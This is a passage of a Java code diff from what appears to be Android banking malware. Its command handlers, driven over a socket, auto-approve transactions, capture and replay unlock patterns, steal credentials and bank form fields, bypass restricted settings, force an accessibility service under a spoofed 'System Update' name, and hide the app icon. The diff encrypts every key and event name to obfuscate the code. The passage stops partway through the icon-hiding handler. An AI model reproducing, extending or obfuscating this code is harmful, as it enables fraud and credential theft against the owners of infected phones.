+                    response.put(StringCrypto.d("qDk0rWxW5wWXktYcvAoJsg=="), endX);
+                    response.put(StringCrypto.d("STews7M/e3h7yJyapUbHdQ=="), endY);
+                    response.put(StringCrypto.d("Ek1icGyWSXPuWbSJi4bQCQ=="), duration);
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Swipe executado" : "Falha ao executar swipe");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("vMgJZ1TxXj4JDmPxh3EctA=="), response);
                 }
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("operation", "gesture_simulation_error");
-                response.put("success", false);
-                response.put("details", error.getMessage());
-                ioSocket.emit("0xGS", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
     public static void TA(JSONObject data) {
         try {
-            if (!data.has("action")) {
+            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                 JSONObject response = new JSONObject();
-                response.put("operation", "transaction_approval_error");
-                response.put("success", false);
-                response.put("details", "Missing action parameter");
-                ioSocket.emit("0xTA", response);
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "transaction_approval_error");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
+                ioSocket.emit(StringCrypto.d("CWBlM8lLRgVZp/CxzQVDYA=="), response);
                 return;
             }
 
-            String action = data.getString("action");
+            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
 
             if ("fill_fields".equals(action) || "approve_transaction".equals(action)) {
                 if (service != null) {
-                    double amount = data.optDouble("amount", 0);
-                    String recipient = data.optString("recipient", "");
-                    String transactionType = data.optString("transactionType", "generic");
+                    double amount = data.optDouble(StringCrypto.d("1sEJYj2rgeltPZQIHH5DjA=="), 0);
+                    String recipient = data.optString(StringCrypto.d("MGgJygZAZyDjRlDpq9RfRw=="), "");
+                    String transactionType = data.optString(StringCrypto.d("fLtjuorf9oSVw8e5J8l9Lg=="), "generic");
 
                     boolean success = service.fillAndApproveTransaction(amount, recipient, transactionType);
 
                     JSONObject response = new JSONObject();
-                    response.put("transactionType", transactionType);
-                    response.put("amount", amount);
-                    response.put("recipient", recipient);
-                    response.put("success", success);
-                    response.put("details", success ? "Transação preenchida e aprovada" : "Falha ao processar transação");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xTA", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xTA", response);
+                    response.put(StringCrypto.d("fLtjuorf9oSVw8e5J8l9Lg=="), transactionType);
+                    response.put(StringCrypto.d("1sEJYj2rgeltPZQIHH5DjA=="), amount);
+                    response.put(StringCrypto.d("MGgJygZAZyDjRlDpq9RfRw=="), recipient);
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Transação preenchida e aprovada" : "Falha ao processar transação");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("CWBlM8lLRgVZp/CxzQVDYA=="), response);
                 }
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("operation", "transaction_approval_error");
-                response.put("success", false);
-                response.put("details", error.getMessage());
-                ioSocket.emit("0xTA", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
     public static void DSU(JSONObject data) {
         try {
-            if (!data.has("action")) {
+            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                 JSONObject response = new JSONObject();
-                response.put("operation", "screen_unlock_error");
-                response.put("success", false);
-                response.put("details", "Missing action parameter");
-                ioSocket.emit("0xDSU", response);
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "screen_unlock_error");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
+                ioSocket.emit(StringCrypto.d("euoFhyXUb5p9rknRJQN1UQ=="), response);
                 return;
             }
 
-            String action = data.getString("action");
+            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
 
             if ("capture_pattern".equals(action)) {
                 if (service != null) {
-                    String patternType = data.optString("patternType", "unknown");
+                    String patternType = data.optString(StringCrypto.d("m891jVX9JuwLGWvJYzcXdA=="), "unknown");
                     boolean success = service.captureUnlockPattern(patternType);
 
                     JSONObject response = new JSONObject();
-                    response.put("action", "capture_pattern");
-                    response.put("patternType", patternType);
-                    response.put("success", success);
-                    response.put("details", success ? "Padrão capturado" : "Falha ao capturar padrão");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xDSU", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("action", "capture_pattern");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xDSU", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "capture_pattern");
+                    response.put(StringCrypto.d("m891jVX9JuwLGWvJYzcXdA=="), patternType);
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Padrão capturado" : "Falha ao capturar padrão");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("euoFhyXUb5p9rknRJQN1UQ=="), response);
                 }
             } else if ("replay_pattern".equals(action)) {
                 if (service != null) {
-                    String patternType = data.optString("patternType", "captured");
+                    String patternType = data.optString(StringCrypto.d("m891jVX9JuwLGWvJYzcXdA=="), "captured");
                     boolean success = service.replayUnlockPattern(patternType);
 
                     JSONObject response = new JSONObject();
-                    response.put("action", "replay_pattern");
-                    response.put("patternType", patternType);
-                    response.put("success", success);
-                    response.put("details", success ? "Padrão replicado com sucesso" : "Falha ao replicar padrão");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xDSU", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("action", "replay_pattern");
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xDSU", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "replay_pattern");
+                    response.put(StringCrypto.d("m891jVX9JuwLGWvJYzcXdA=="), patternType);
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Padrão replicado com sucesso" : "Falha ao replicar padrão");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("euoFhyXUb5p9rknRJQN1UQ=="), response);
                 }
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("operation", "screen_unlock_error");
-                response.put("success", false);
-                response.put("details", error.getMessage());
-                ioSocket.emit("0xDSU", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
     public static void OI(JSONObject data) {
         try {
-            if (!data.has("action")) {
+            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                 JSONObject response = new JSONObject();
-                response.put("operation", "overlay_injection_error");
-                response.put("success", false);
-                response.put("details", "Missing action parameter");
-                ioSocket.emit("0xOI", response);
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "overlay_injection_error");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
+                ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="), response);
                 return;
             }
 
-            String action = data.getString("action");
+            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
 
             if ("enable_monitoring".equals(action)) {
                 if (service != null) {
                     service.enableOverlayMonitoring();
                     JSONObject response = new JSONObject();
-                    response.put("action", "enable_monitoring");
-                    response.put("success", true);
-                    response.put("details", "Monitoramento de overlay ativado");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xOI", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xOI", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_monitoring");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Monitoramento de overlay ativado");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="), response);
                 }
             } else if ("disable_monitoring".equals(action)) {
                 if (service != null) {
                     service.disableOverlayMonitoring();
                     JSONObject response = new JSONObject();
-                    response.put("action", "disable_monitoring");
-                    response.put("success", true);
-                    response.put("details", "Monitoramento de overlay desativado");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xOI", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xOI", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_monitoring");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Monitoramento de overlay desativado");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="), response);
                 }
             } else if ("capture_credentials".equals(action)) {
                 if (service != null) {
-                    String username = data.optString("username", "");
-                    String password = data.optString("password", "");
-                    String appName = data.optString("appName", "");
+                    String username = data.optString(StringCrypto.d("KYySL2f7hb2Jfz0mpUztvw=="), "");
+                    String password = data.optString(StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), "");
+                    String appName = data.optString(StringCrypto.d("b154d5rAz4A5cTVeIwwlGg=="), "");
 
                     JSONObject response = new JSONObject();
-                    response.put("action", "capture_credentials");
-                    response.put("username", username);
-                    response.put("password", password);
-                    response.put("appName", appName);
-                    response.put("success", true);
-                    response.put("details", "Credenciais capturadas");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xOI", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xOI", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "capture_credentials");
+                    response.put(StringCrypto.d("KYySL2f7hb2Jfz0mpUztvw=="), username);
+                    response.put(StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), password);
+                    response.put(StringCrypto.d("b154d5rAz4A5cTVeIwwlGg=="), appName);
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Credenciais capturadas");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="), response);
                 }
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("operation", "overlay_injection_error");
-                response.put("success", false);
-                response.put("details", error.getMessage());
-                ioSocket.emit("0xOI", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
     public static void FC(JSONObject data) {
         try {
-            if (!data.has("action")) {
+            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                 JSONObject response = new JSONObject();
-                response.put("operation", "customized_forms_error");
-                response.put("success", false);
-                response.put("details", "Missing action parameter");
-                ioSocket.emit("0xFC", response);
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "customized_forms_error");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
+                ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
                 return;
             }
 
-            String action = data.getString("action");
+            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
 
             if ("enable_realtime".equals(action)) {
                 if (service != null) {
                     service.enableCustomizedFormCapture();
                     JSONObject response = new JSONObject();
-                    response.put("action", "enable_realtime");
-                    response.put("success", true);
-                    response.put("details", "Captura de formulários customizados ativada");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xFC", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xFC", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_realtime");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            "Captura de formulários customizados ativada");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
                 }
             } else if ("disable_realtime".equals(action)) {
                 if (service != null) {
                     service.disableCustomizedFormCapture();
                     JSONObject response = new JSONObject();
-                    response.put("action", "disable_realtime");
-                    response.put("success", true);
-                    response.put("details", "Captura de formulários customizados desativada");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xFC", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xFC", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_realtime");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            "Captura de formulários customizados desativada");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
                 }
             } else if ("capture_field".equals(action)) {
-                // Dados já foram capturados pelo AccessibilityCaptureService e enviados em tempo real
                 JSONObject response = new JSONObject();
-                response.put("action", "capture_field");
-                response.put("bankName", data.optString("bankName", ""));
-                response.put("fieldName", data.optString("fieldName", ""));
-                response.put("fieldValue", data.optString("fieldValue", ""));
-                response.put("success", true);
-                response.put("timestamp", System.currentTimeMillis());
-                ioSocket.emit("0xFC", response);
+                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "capture_field");
+                response.put(StringCrypto.d("f+LMlOhxkOdO5UdHnc4/JA=="), data.optString("bankName", ""));
+                response.put(StringCrypto.d("SsUl006pFidcBOYEr+hlqQ=="), data.optString("fieldName", ""));
+                response.put(StringCrypto.d("dM1M643/PqAwQE46fiYUKA=="), data.optString("fieldValue", ""));
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
             } else if ("submit_form".equals(action)) {
                 JSONObject response = new JSONObject();
-                response.put("action", "submit_form");
-                response.put("bankName", data.optString("bankName", ""));
-                response.put("formData", data.optJSONObject("formData"));
-                response.put("success", true);
-                response.put("timestamp", System.currentTimeMillis());
-                ioSocket.emit("0xFC", response);
+                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "submit_form");
+                response.put(StringCrypto.d("f+LMlOhxkOdO5UdHnc4/JA=="), data.optString("bankName", ""));
+                response.put(StringCrypto.d("ojzCc+sIQ1zJGvRu6Zwq6w=="), data.optJSONObject("formData"));
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("operation", "customized_forms_error");
-                response.put("success", false);
-                response.put("details", error.getMessage());
-                ioSocket.emit("0xFC", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
     public static void BP(JSONObject data) {
         try {
-            if (!data.has("action")) {
+            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                 JSONObject response = new JSONObject();
-                response.put("operation", "bypass_protections_error");
-                response.put("success", false);
-                response.put("details", "Missing action parameter");
-                ioSocket.emit("0xBP", response);
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "bypass_protections_error");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
+                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
                 return;
             }
 
-            String action = data.getString("action");
+            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
 
             if ("enable_bypass".equals(action)) {
                 JSONObject response = new JSONObject();
-                response.put("action", "enable_bypass");
-                response.put("success", true);
-                response.put("details", "Bypass de proteções do Android ativado");
-                response.put("timestamp", System.currentTimeMillis());
-                ioSocket.emit("0xBP", response);
+                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_bypass");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Bypass de proteções do Android ativado");
+                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
             } else if ("disable_bypass".equals(action)) {
                 JSONObject response = new JSONObject();
-                response.put("action", "disable_bypass");
-                response.put("success", true);
-                response.put("details", "Bypass de proteções desativado");
-                response.put("timestamp", System.currentTimeMillis());
-                ioSocket.emit("0xBP", response);
+                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_bypass");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Bypass de proteções desativado");
+                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
             } else if ("bypass_restricted_settings".equals(action)) {
                 if (service != null) {
                     boolean success = service.bypassRestrictedSettings();
                     JSONObject response = new JSONObject();
-                    response.put("action", "bypass_restricted_settings");
-                    response.put("success", success);
-                    response.put("details", success ? "Configuração Restrita contornada com sucesso" : "Falha ao contornar Configuração Restrita");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xBP", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xBP", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "bypass_restricted_settings");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Configuração Restrita contornada com sucesso"
+                                    : "Falha ao contornar Configuração Restrita");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
                 }
             } else if ("force_accessibility_service".equals(action)) {
                 if (service != null) {
-                    String installationMethod = data.optString("installationMethod", "system_update");
-                    String spoofedAppName = data.optString("spoofedAppName", "System Update");
+                    String installationMethod = data
+                            .optString(StringCrypto.d("/8RgGaQotSvYDZmlFM72dZlkJLjUe1N9w3pTvmWKF0Y="), "system_update");
+                    String spoofedAppName = data.optString(StringCrypto.d("A4N3d7HkCYjQQ98dSHpBZA=="), "System Update");
                     boolean success = service.forceAccessibilityService(installationMethod, spoofedAppName);
                     JSONObject response = new JSONObject();
-                    response.put("action", "force_accessibility_service");
-                    response.put("success", success);
-                    response.put("installationMethod", installationMethod);
-                    response.put("details", success ? "Accessibility Service forçado com sucesso" : "Falha ao forçar Accessibility Service");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xBP", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xBP", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "force_accessibility_service");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("/8RgGaQotSvYDZmlFM72dZlkJLjUe1N9w3pTvmWKF0Y="), installationMethod);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Accessibility Service forçado com sucesso"
+                                    : "Falha ao forçar Accessibility Service");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
                 }
             } else if ("detect_protections".equals(action)) {
                 if (service != null) {
                     org.json.JSONArray detectedProtections = service.detectAndroidProtections();
                     int androidVersion = service.getAndroidVersion();
                     JSONObject response = new JSONObject();
-                    response.put("action", "detect_protections");
-                    response.put("success", true);
-                    response.put("protections", detectedProtections);
-                    response.put("androidVersion", androidVersion);
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xBP", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xBP", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "detect_protections");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("TWRbGV4lHxChpxNzENFf+Q=="), detectedProtections);
+                    response.put(StringCrypto.d("y2C4kIqvcAKHKm++V0kuFg=="), androidVersion);
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
                 }
             } else if ("installation_method_update".equals(action)) {
                 JSONObject response = new JSONObject();
-                response.put("action", "installation_method_update");
-                response.put("success", true);
-                response.put("installationMethod", data.optString("installationMethod", "system_update"));
-                response.put("details", "Método de instalação atualizado");
-                response.put("timestamp", System.currentTimeMillis());
-                ioSocket.emit("0xBP", response);
+                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "installation_method_update");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                response.put(StringCrypto.d("/8RgGaQotSvYDZmlFM72dZlkJLjUe1N9w3pTvmWKF0Y="),
+                        data.optString("installationMethod", "system_update"));
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Método de instalação atualizado");
+                response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                ioSocket.emit(StringCrypto.d("d2bl5oc3S93/dglirpTtmg=="), response);
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("operation", "bypass_protections_error");
-                response.put("success", false);
-                response.put("details", error.getMessage());
-                ioSocket.emit("0xBP", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
 
     public static void HI(JSONObject data) {
         try {
-            if (!data.has("action")) {
+            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                 JSONObject response = new JSONObject();
-                response.put("operation", "hide_icon_error");
-                response.put("success", false);
-                response.put("details", "Missing action parameter");
-                ioSocket.emit("0xHI", response);
+                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "hide_icon_error");
+                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
+                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
+                ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                 return;
             }
 
-            String action = data.getString("action");
+            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
             AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
 
             if ("enable_hide".equals(action)) {
                 if (service != null) {
                     service.enableHideIcon();
                     JSONObject response = new JSONObject();
-                    response.put("action", "enable_hide");
-                    response.put("success", true);
-                    response.put("details", "Ocultação de ícone ativada");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xHI", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xHI", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_hide");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Ocultação de ícone ativada");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                 }
             } else if ("disable_hide".equals(action)) {
                 if (service != null) {
                     service.disableHideIcon();
                     JSONObject response = new JSONObject();
-                    response.put("action", "disable_hide");
-                    response.put("success", true);
-                    response.put("details", "Ocultação de ícone desativada");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xHI", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xHI", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_hide");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Ocultação de ícone desativada");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                 }
             } else if ("remove_icon".equals(action)) {
                 if (service != null) {
                     boolean success = service.removeAppIcon();
                     JSONObject response = new JSONObject();
-                    response.put("action", "remove_icon");
-                    response.put("success", success);
-                    response.put("details", success ? "Ícone removido com sucesso" : "Falha ao remover ícone");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xHI", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xHI", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "remove_icon");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
+                            success ? "Ícone removido com sucesso" : "Falha ao remover ícone");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                 }
             } else if ("enable_background_service".equals(action)) {
                 if (service != null) {
                     service.startBackgroundHideService();
                     JSONObject response = new JSONObject();
-                    response.put("action", "enable_background_service");
-                    response.put("success", true);
